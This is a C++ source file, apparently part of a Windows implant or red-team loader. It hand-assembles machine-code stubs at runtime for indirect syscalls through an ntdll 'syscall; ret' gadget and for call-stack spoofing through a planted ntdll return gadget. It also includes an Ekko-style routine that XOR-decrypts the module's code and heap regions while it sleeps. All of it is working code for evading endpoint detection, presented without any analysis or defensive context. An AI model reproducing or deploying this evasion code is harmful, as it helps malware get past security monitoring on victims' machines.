#include <windows.h>

#include <cstdint>
#include <cstring>

// C++ trampolines matching the MASM stubs (used when MASM is not linked).

extern "C" {

std::uint32_t  g_ssn = 0;
std::uintptr_t g_gadget = 0;
std::uintptr_t g_gadgetRet = 0;

alignas(16) unsigned char ekkoCtxB[1232] = {};
alignas(16) unsigned char ekkoKey[16] = {};
std::uintptr_t ekkoText = 0;
std::uintptr_t ekkoSize = 0;
alignas(16) unsigned char ekkoHeapKey[16] = {};
std::uintptr_t ekkoHeapText = 0;
std::uintptr_t ekkoHeapSize = 0;
std::uintptr_t ekkoNtContinue = 0;
std::uintptr_t ekkoRetGadget = 0;
std::uintptr_t ekkoFakeStackTop = 0;
std::uintptr_t ekkoEvent = 0;
std::uintptr_t ekkoSetEvent = 0;
std::uintptr_t ekkoExitThread = 0;
alignas(16) unsigned char ekkoFakeStack[4096] = {};

} // extern "C"

namespace {

void* alloc_rw(std::size_t n) {
    return VirtualAlloc(nullptr, n, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
}

bool protect_rx(void* m, std::size_t n) {
    DWORD old = 0;
    return VirtualProtect(m, n, PAGE_EXECUTE_READ, &old) != 0;
}

using SyscallFn = NTSTATUS(NTAPI*)(
    std::uintptr_t, std::uintptr_t, std::uintptr_t, std::uintptr_t,
    std::uintptr_t, std::uintptr_t, std::uintptr_t, std::uintptr_t,
    std::uintptr_t, std::uintptr_t, std::uintptr_t, std::uintptr_t);

SyscallFn g_indirect = nullptr;

// mov r10, rcx; mov eax, [g_ssn]; jmp [g_gadget]  -> ntdll `syscall; ret`
bool ensure_indirect_stub() {
    if (g_indirect) return true;

    void* mem = alloc_rw(64);
    if (!mem) return false;
    auto* p = static_cast<std::uint8_t*>(mem);
    std::size_t i = 0;

    p[i++] = 0x4C; p[i++] = 0x8B; p[i++] = 0xD1; // mov r10, rcx

    p[i++] = 0x48; p[i++] = 0xB8; // mov rax, imm64
    std::uintptr_t ssn_addr = reinterpret_cast<std::uintptr_t>(&g_ssn);
    std::memcpy(p + i, &ssn_addr, 8); i += 8;

    p[i++] = 0x8B; p[i++] = 0x00; // mov eax, [rax]

    p[i++] = 0x49; p[i++] = 0xBB; // mov r11, imm64
    std::uintptr_t gad_addr = reinterpret_cast<std::uintptr_t>(&g_gadget);
    std::memcpy(p + i, &gad_addr, 8); i += 8;

    p[i++] = 0x41; p[i++] = 0xFF; p[i++] = 0x23; // jmp qword ptr [r11]

    if (!protect_rx(mem, 64)) {
        VirtualFree(mem, 0, MEM_RELEASE);
        return false;
    }
    g_indirect = reinterpret_cast<SyscallFn>(mem);
    return true;
}

using SpoofFn = void* (*)(void* target, std::uintptr_t a0, std::uintptr_t a1,
                          std::uintptr_t a2, std::uintptr_t a3);
SpoofFn g_spoof = nullptr;

// Matches StackSpoof.asm: plant ntdll `add rsp,0x20; ret` as return address.
bool ensure_spoof_stub() {
    if (g_spoof) return true;

    constexpr std::size_t kContOff = 0x40;
    void* mem = alloc_rw(128);
    if (!mem) return false;
    auto* p = static_cast<std::uint8_t*>(mem);
    std::memset(p, 0x90, 128);

    std::size_t i = 0;

    p[i++] = 0x55;                                           // push rbp
    p[i++] = 0x53;                                           // push rbx
    p[i++] = 0x48; p[i++] = 0x83; p[i++] = 0xEC; p[i++] = 0x20; // sub rsp, 0x20

    p[i++] = 0x48; p[i++] = 0x89; p[i++] = 0xCB;             // mov rbx, rcx
    p[i++] = 0x48; p[i++] = 0x89; p[i++] = 0xD1;             // mov rcx, rdx
    p[i++] = 0x4C; p[i++] = 0x89; p[i++] = 0xC2;             // mov rdx, r8
    p[i++] = 0x4D; p[i++] = 0x89; p[i++] = 0xC8;             // mov r8, r9
    // a3 at entry [rsp+0x28]; after push*2 + sub 0x20 -> [rsp+0x58]
    p[i++] = 0x4C; p[i++] = 0x8B; p[i++] = 0x4C; p[i++] = 0x24; p[i++] = 0x58;

    // lea rbp, [rip + (cont - next)]
    p[i++] = 0x48; p[i++] = 0x8D; p[i++] = 0x2D;
    std::int32_t lea_disp = static_cast<std::int32_t>(kContOff - (i + 4));
    std::memcpy(p + i, &lea_disp, 4); i += 4;

    p[i++] = 0x55;                                           // push rbp (cont)
    p[i++] = 0x48; p[i++] = 0x83; p[i++] = 0xEC; p[i++] = 0x20; // sub rsp, 0x20

    p[i++] = 0x48; p[i++] = 0xB8; // mov rax, &g_gadgetRet
    std::uintptr_t gr = reinterpret_cast<std::uintptr_t>(&g_gadgetRet);
    std::memcpy(p + i, &gr, 8); i += 8;
    p[i++] = 0x48; p[i++] = 0x8B; p[i++] = 0x00;             // mov rax, [rax]

    p[i++] = 0x50;                                           // push rax
    p[i++] = 0xFF; p[i++] = 0xE3;                             // jmp rbx

    if (i > kContOff) {
        VirtualFree(mem, 0, MEM_RELEASE);
        return false;
    }

    i = kContOff;
    p[i++] = 0x48; p[i++] = 0x83; p[i++] = 0xC4; p[i++] = 0x20; // add rsp, 0x20
    p[i++] = 0x5B;                                           // pop rbx
    p[i++] = 0x5D;                                           // pop rbp
    p[i++] = 0xC3;                                           // ret

    if (!protect_rx(mem, 128)) {
        VirtualFree(mem, 0, MEM_RELEASE);
        return false;
    }
    g_spoof = reinterpret_cast<SpoofFn>(mem);
    return true;
}

} // namespace

extern "C" NTSTATUS IndirectSyscall(
    std::uintptr_t a0,  std::uintptr_t a1,
    std::uintptr_t a2,  std::uintptr_t a3,
    std::uintptr_t a4,  std::uintptr_t a5,
    std::uintptr_t a6,  std::uintptr_t a7,
    std::uintptr_t a8,  std::uintptr_t a9,
    std::uintptr_t a10, std::uintptr_t a11) {
    if (!g_gadget) return static_cast<NTSTATUS>(0xC0000001L);
    if (!ensure_indirect_stub()) return static_cast<NTSTATUS>(0xC0000001L);
    return g_indirect(a0, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11);
}

extern "C" void* SpoofCall(void* target, std::uintptr_t a0, std::uintptr_t a1,
                           std::uintptr_t a2, std::uintptr_t a3) {
    if (!target || !g_gadgetRet) return nullptr;
    if (!ensure_spoof_stub()) return nullptr;
    return g_spoof(target, a0, a1, a2, a3);
}

extern "C" void EkkoDecrypt() {
    auto xor_region = [](std::uintptr_t base, std::uintptr_t size, const unsigned char key[16]) {
        if (!base || !size) return;
        auto* p = reinterpret_cast<unsigned char*>(base);
        for (std::uintptr_t i = 0; i < size; ++i) p[i] ^= key[i & 15];
    };

    xor_region(ekkoText, ekkoSize, ekkoKey);
    xor_region(ekkoHeapText, ekkoHeapSize, ekkoHeapKey);

    if (ekkoSetEvent && ekkoEvent) {
        using SetEventFn = BOOL(WINAPI*)(HANDLE);
        reinterpret_cast<SetEventFn>(ekkoSetEvent)(reinterpret_cast<HANDLE>(ekkoEvent));
    }
    if (ekkoExitThread) {
        using ExitThreadFn = void(WINAPI*)(DWORD);
        reinterpret_cast<ExitThreadFn>(ekkoExitThread)(0);
    }
}
